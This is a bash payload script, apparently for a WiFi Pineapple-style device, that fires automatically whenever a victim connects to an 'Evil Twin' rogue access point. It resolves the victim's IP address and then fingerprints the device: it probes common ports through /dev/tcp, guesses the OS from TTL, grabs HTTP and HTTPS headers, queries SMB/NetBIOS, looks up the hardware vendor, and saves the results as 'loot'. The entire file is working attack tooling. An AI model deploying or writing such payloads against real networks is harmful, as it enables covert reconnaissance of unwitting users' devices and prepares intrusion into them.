#!/bin/bash
# Title: MUNINN - Post-Connect Enumeration
# Description: Alert payload that enumerates clients when they connect to Evil Twin
# Author: HaleHound
# Version: 1.0.0
# Category: alerts/pineapple_client_connected
#
# Named after Odin's memory raven - MUNINN remembers everything
# Complements HUGINN (thought) with post-connect intelligence
#
# ALERT PAYLOAD: This runs automatically when a client connects
# Install to: /root/payloads/alerts/pineapple_client_connected/
#
# Uses FIND_CLIENT_IP command to resolve client MAC to IP
# Uses alert environment variables for client details

# === CONFIGURATION ===
LOOTDIR="/root/loot/muninn"
TIMEOUT_IP=30            # Seconds to wait for IP assignment
TIMEOUT_ENUM=60          # Seconds for enumeration
INPUT=/dev/input/event0

# === ALERT ENVIRONMENT VARIABLES ===
# These are provided by the Pager when alert fires:
# $_ALERT_CLIENT_CONNECTED_SUMMARY
# $_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS
# $_ALERT_CLIENT_CONNECTED_AP_MAC_ADDRESS
# $_ALERT_CLIENT_CONNECTED_SSID

CLIENT_MAC="${_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS:-}"
AP_MAC="${_ALERT_CLIENT_CONNECTED_AP_MAC_ADDRESS:-}"
SSID="${_ALERT_CLIENT_CONNECTED_SSID:-}"
SUMMARY="${_ALERT_CLIENT_CONNECTED_SUMMARY:-}"

# === CLEANUP ===
cleanup() {
    pkill -f "muninn_enum" 2>/dev/null
    rm -f /tmp/muninn_running
}

trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_alert() {
    LED CYAN
}

led_resolving() {
    LED AMBER
}

led_enumerating() {
    LED MAGENTA
}

led_success() {
    LED GREEN
}

led_error() {
    LED RED
}

# === SOUNDS ===
play_alert() {
    RINGTONE "alert:d=4,o=6,b=200:c,e,g" &
}

play_found() {
    RINGTONE "found:d=8,o=5,b=180:e,g,b,e6" &
}

play_complete() {
    RINGTONE "done:d=4,o=5,b=160:g,e,c" &
}

# === LOGGING ===
LOGFILE=""

init_logging() {
    mkdir -p "$LOOTDIR"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local safe_mac=$(echo "$CLIENT_MAC" | tr ':' '-')
    LOGFILE="$LOOTDIR/client_${safe_mac}_${timestamp}.log"

    {
        echo "========================================"
        echo "MUNINN - Client Enumeration Report"
        echo "========================================"
        echo ""
        echo "Timestamp: $(date)"
        echo "Client MAC: $CLIENT_MAC"
        echo "AP MAC: $AP_MAC"
        echo "SSID: $SSID"
        echo ""
        echo "========================================"
    } > "$LOGFILE"
}

log_section() {
    local section=$1
    echo "" >> "$LOGFILE"
    echo "=== $section ===" >> "$LOGFILE"
}

log_data() {
    echo "$1" >> "$LOGFILE"
}

# === IP RESOLUTION ===
resolve_client_ip() {
    LOG "Resolving client IP..."
    led_resolving

    # Use the verified FIND_CLIENT_IP command
    local ip=""
    ip=$(FIND_CLIENT_IP "$CLIENT_MAC" "$TIMEOUT_IP")
    local result=$?

    if [ $result -eq 0 ] && [ -n "$ip" ]; then
        LOG "Resolved: $ip"
        echo "$ip"
        return 0
    fi

    # Fallback: check ARP table
    LOG "FIND_CLIENT_IP failed, checking ARP..."
    local arp_ip=$(arp -an | grep -i "$CLIENT_MAC" | awk '{print $2}' | tr -d '()')

    if [ -n "$arp_ip" ]; then
        LOG "ARP resolved: $arp_ip"
        echo "$arp_ip"
        return 0
    fi

    # Another fallback: check DHCP leases
    LOG "Checking DHCP leases..."
    if [ -f /tmp/dhcp.leases ]; then
        local lease_ip=$(grep -i "$CLIENT_MAC" /tmp/dhcp.leases | awk '{print $3}')
        if [ -n "$lease_ip" ]; then
            LOG "DHCP resolved: $lease_ip"
            echo "$lease_ip"
            return 0
        fi
    fi

    LOG "Could not resolve IP"
    return 1
}

# === ENUMERATION FUNCTIONS ===

# Basic connectivity check
enum_ping() {
    local ip=$1
    log_section "PING TEST"

    if ping -c 3 -W 2 "$ip" >> "$LOGFILE" 2>&1; then
        log_data "Status: REACHABLE"
        return 0
    else
        log_data "Status: UNREACHABLE"
        return 1
    fi
}

# Port scan (quick)
enum_ports() {
    local ip=$1
    log_section "PORT SCAN"

    # Quick scan of common ports
    local common_ports="21 22 23 25 53 80 110 139 143 443 445 993 995 3389 5900 8080"

    for port in $common_ports; do
        if timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null; then
            log_data "Port $port: OPEN"
            LOG "Open: $port"
        fi
    done
}

# OS fingerprint (basic)
enum_os() {
    local ip=$1
    log_section "OS FINGERPRINT"

    # TTL-based guess
    local ttl=$(ping -c 1 -W 2 "$ip" 2>/dev/null | grep "ttl=" | sed 's/.*ttl=\([0-9]*\).*/\1/')

    if [ -n "$ttl" ]; then
        log_data "TTL: $ttl"

        if [ "$ttl" -le 64 ]; then
            log_data "Likely OS: Linux/Unix/macOS"
            LOG "OS guess: Linux/Unix (TTL $ttl)"
        elif [ "$ttl" -le 128 ]; then
            log_data "Likely OS: Windows"
            LOG "OS guess: Windows (TTL $ttl)"
        else
            log_data "Likely OS: Network device/Router"
            LOG "OS guess: Network device (TTL $ttl)"
        fi
    fi
}

# HTTP fingerprint
enum_http() {
    local ip=$1
    log_section "HTTP FINGERPRINT"

    # Check port 80
    if timeout 3 bash -c "echo >/dev/tcp/$ip/80" 2>/dev/null; then
        log_data "Port 80: OPEN"

        local headers=$(curl -s -I -m 5 "http://$ip/" 2>/dev/null | head -20)
        if [ -n "$headers" ]; then
            log_data ""
            log_data "HTTP Headers:"
            log_data "$headers"

            local server=$(echo "$headers" | grep -i "^Server:" | head -1)
            if [ -n "$server" ]; then
                LOG "HTTP: $server"
            fi
        fi
    fi

    # Check port 443
    if timeout 3 bash -c "echo >/dev/tcp/$ip/443" 2>/dev/null; then
        log_data ""
        log_data "Port 443: OPEN (HTTPS)"

        local https_headers=$(curl -s -I -k -m 5 "https://$ip/" 2>/dev/null | head -20)
        if [ -n "$https_headers" ]; then
            log_data ""
            log_data "HTTPS Headers:"
            log_data "$https_headers"
        fi
    fi
}

# NetBIOS/SMB fingerprint
enum_smb() {
    local ip=$1
    log_section "SMB/NETBIOS"

    # Check SMB port
    if timeout 2 bash -c "echo >/dev/tcp/$ip/445" 2>/dev/null; then
        log_data "Port 445 (SMB): OPEN"
        LOG "SMB port open"

        # Try nbtscan if available
        if command -v nbtscan >/dev/null 2>&1; then
            local nbinfo=$(nbtscan -r "$ip" 2>/dev/null)
            if [ -n "$nbinfo" ]; then
                log_data ""
                log_data "NetBIOS Info:"
                log_data "$nbinfo"
            fi
        fi
    fi

    # Check NetBIOS port
    if timeout 2 bash -c "echo >/dev/tcp/$ip/139" 2>/dev/null; then
        log_data "Port 139 (NetBIOS): OPEN"
    fi
}

# MAC vendor lookup
enum_vendor() {
    log_section "MAC VENDOR"

    # Extract OUI (first 3 octets)
    local oui=$(echo "$CLIENT_MAC" | tr ':' '-' | cut -d'-' -f1-3 | tr '[:lower:]' '[:upper:]')

    log_data "MAC: $CLIENT_MAC"
    log_data "OUI: $oui"

    # Check local OUI database if exists
    if [ -f /usr/share/nmap/nmap-mac-prefixes ]; then
        local vendor=$(grep -i "^$oui" /usr/share/nmap/nmap-mac-prefixes | cut -f2)
        if [ -n "$vendor" ]; then
            log_data "Vendor: $vendor"
            LOG "Vendor: $vendor"
        fi
    elif [ -f /usr/share/ieee-data/oui.txt ]; then
        local vendor=$(grep -i "$oui" /usr/share/ieee-data/oui.txt | head -1 | cut -d')' -f2 | xargs)
        if [ -n "$vendor" ]; then
            log_data "Vendor: $vendor"
            LOG "Vendor: $vendor"
        fi
    fi

    # Common vendor prefixes (fallback)
    case "${oui:0:8}" in
        "00-50-56"|"00-0C-29"|"00-15-5D")
            log_data "Type: Virtual Machine"
            LOG "Type: VM detected"
            ;;
        "AC-DE-48"|"18-FE-34"|"60-01-94")
            log_data "Type: IoT/ESP Device"
            LOG "Type: IoT device"
            ;;
    esac
}

# DNS fingerprint
enum_dns() {
    local ip=$1
    log_section "DNS FINGERPRINT"

    # Reverse DNS
    local hostname=$(nslookup "$ip" 2>/dev/null | grep "name = " | awk '{print $NF}')
    if [ -n "$hostname" ]; then
        log_data "Reverse DNS: $hostname"
        LOG "Hostname: $hostname"
    fi

    # mDNS/Bonjour check
    if timeout 2 bash -c "echo >/dev/tcp/$ip/5353" 2>/dev/null; then
        log_data "Port 5353 (mDNS): OPEN"
    fi
}

# === MAIN ENUMERATION ===
run_enumeration() {
    local ip=$1

    led_enumerating
    LOG ""
    LOG "=== ENUMERATING $ip ==="
    LOG ""

    # Run all enumeration modules
    enum_vendor

    if enum_ping "$ip"; then
        enum_os "$ip"
        enum_ports "$ip"
        enum_http "$ip"
        enum_smb "$ip"
        enum_dns "$ip"
    else
        log_section "ENUMERATION FAILED"
        log_data "Client unreachable after connection"
        LOG "Client unreachable"
    fi

    # Final summary
    log_section "ENUMERATION COMPLETE"
    log_data "Ended: $(date)"
}

# === MAIN ===

# Validate we're running as an alert payload
if [ -z "$CLIENT_MAC" ]; then
    LOG "ERROR: Not running as alert payload"
    LOG ""
    LOG "MUNINN must be installed to:"
    LOG "/root/payloads/alerts/pineapple_client_connected/"
    LOG ""
    LOG "It runs automatically when clients connect."
    exit 1
fi

# Alert received!
led_alert
play_alert
VIBRATE

LOG ""
LOG " __  __ _   _ _  _ ___ _  _ _  _ "
LOG "|  \\/  | | | | \\| |_ _| \\| | \\| |"
LOG "| |\\/| | |_| | .\` || || .\` | .\` |"
LOG "|_|  |_|\\___/|_|\\_|___|_|\\_|_|\\_|"
LOG ""
LOG "      Memory Raven v1.0"
LOG ""
LOG "CLIENT CONNECTED!"
LOG ""
LOG "MAC: $CLIENT_MAC"
LOG "SSID: $SSID"
LOG "AP: $AP_MAC"
LOG ""

# Initialize logging
init_logging

LOG "Log: $LOGFILE"
LOG ""

# Resolve IP
CLIENT_IP=$(resolve_client_ip)

if [ -z "$CLIENT_IP" ]; then
    led_error
    LOG "Failed to resolve client IP"
    log_section "IP RESOLUTION FAILED"
    log_data "Could not obtain client IP address"

    # Still save what we know
    ALERT "MUNINN: Client Connected\n\nMAC: $CLIENT_MAC\nSSID: $SSID\n\nIP resolution failed\nManual enum required"
    exit 1
fi

LOG "Client IP: $CLIENT_IP"
log_section "IP RESOLUTION"
log_data "Client IP: $CLIENT_IP"

play_found
VIBRATE

# Run enumeration
run_enumeration "$CLIENT_IP"

# Complete
led_success
play_complete
VIBRATE
VIBRATE

LOG ""
LOG "=== ENUMERATION COMPLETE ==="
LOG "Report: $LOGFILE"
LOG ""

# Show alert summary
ALERT "MUNINN: Client Enumerated\n\nMAC: $CLIENT_MAC\nIP: $CLIENT_IP\nSSID: $SSID\n\nReport saved to:\n$LOGFILE"

exit 0
